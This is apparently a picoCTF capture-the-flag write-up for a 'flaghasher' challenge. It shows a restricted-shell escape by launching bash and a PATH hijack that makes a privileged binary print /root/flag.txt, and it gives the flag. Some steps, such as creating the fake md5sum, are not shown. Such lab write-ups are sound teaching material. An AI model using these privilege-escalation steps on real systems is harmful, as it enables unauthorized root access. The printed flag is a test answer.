# Description

Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!Connect using `ssh @rescued-float.picoctf.net` with the password,  and run the binary named "flaghasher".

# Solution

This challenge should be related with [[hash-only-1]], first we identify that instead of our home directory the binary is in the /usr/local/bin path now.

```
ctf-player@pico-chall$ whereis flaghasher
flaghasher: /usr/local/bin/flaghasher
```

Seems like we are in a restricted shell that doesn't allow us to modify environment variables like we did before with [[hash-only-1]] or do other stuff like call files directly using a full path /xxx/xxx.

```
ctf-player@pico-chall$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/' in command names
```

Just for the lulz we tested if we were able to call other shells like bash and that did the trick, we were able to escape the "restricted" shell.

```
ctf-player@pico-chall$ bash
ctf-player@challenge:~$ export PATH=./:$PATH
ctf-player@challenge:~$ echo $PATH
./:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ctf-player@challenge:~$ /usr/local/bin/flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs}
```